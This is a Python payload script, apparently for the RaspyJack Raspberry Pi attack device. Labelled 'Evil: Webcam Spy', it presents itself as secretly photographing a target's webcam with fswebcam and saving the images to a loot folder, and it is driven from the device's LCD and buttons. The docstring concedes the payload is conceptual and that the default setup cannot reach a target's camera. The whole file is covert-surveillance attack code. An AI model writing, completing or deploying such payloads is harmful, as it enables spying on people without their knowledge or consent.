#!/usr/bin/env python3
"""
RaspyJack *payload* – **Evil: Webcam Spy**
===========================================
A payload that secretly captures an image from the target's webcam
and saves it to the loot directory.

This requires `fswebcam` to be installed on the RaspyJack, and for the
RaspyJack to be connected to a target computer as a USB device that can
access its webcam (e.g., via USB pass-through, which is an advanced
P4wnP1 A.L.O.A. feature).

**NOTE:** This is a conceptual payload. The default RaspyJack setup does
not enable webcam access from the Pi. This script shows how such a
payload would be structured.
"""

import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
LOOT_DIR = "/root/Raspyjack/loot/Webcam_Spy/"

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# --- Main ---
def show_message(lines, color="red"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    y = 40
    for line in lines:
        d.text((5, y), line, font=FONT_TITLE, fill=color)
        y += 15
    LCD.LCD_ShowImage(img, 0, 0)

def run_capture():
    show_message(["Capturing image..."])
    
    try:
        os.makedirs(LOOT_DIR, exist_ok=True)
        timestamp = time.strftime("%Y-%m-%d_%H%M%S")
        output_file = os.path.join(LOOT_DIR, f"webcam_{timestamp}.jpg")
        
        # Command to capture image from webcam.
        # The `-d` device might need to be changed.
        # The `--no-banner` flag removes the timestamp overlay.
        command = f"fswebcam -r 1280x720 --no-banner {output_file}"
        
        proc = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, timeout=15)
        
        if os.path.exists(output_file):
            show_message(["Image captured!", "Saved to loot."], "lime")
        else:
            raise Exception("File not created.")

    except subprocess.TimeoutExpired:
        show_message(["Capture timed out!", "Is webcam busy?"], "red")
    except Exception as e:
        show_message(["Capture FAILED!", "Is webcam", "connected?"], "red")
        print(f"Webcam capture failed: {e}", file=sys.stderr)
        if 'proc' in locals(): print(proc.stderr, file=sys.stderr)

if __name__ == '__main__':
    try:
        if subprocess.run("which fswebcam", shell=True, capture_output=True).returncode != 0:
            show_message(["fswebcam", "not found!"], "red")
            time.sleep(3)
        else:
            show_message(["Webcam Spy", "Press OK to", "capture image."])
            while True:
                if GPIO.input(PINS["KEY3"]) == 0:
                    break
                if GPIO.input(PINS["OK"]) == 0:
                    run_capture()
                    time.sleep(4)
                    show_message(["Ready."])
                time.sleep(0.1)
            
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Webcam Spy payload finished.")
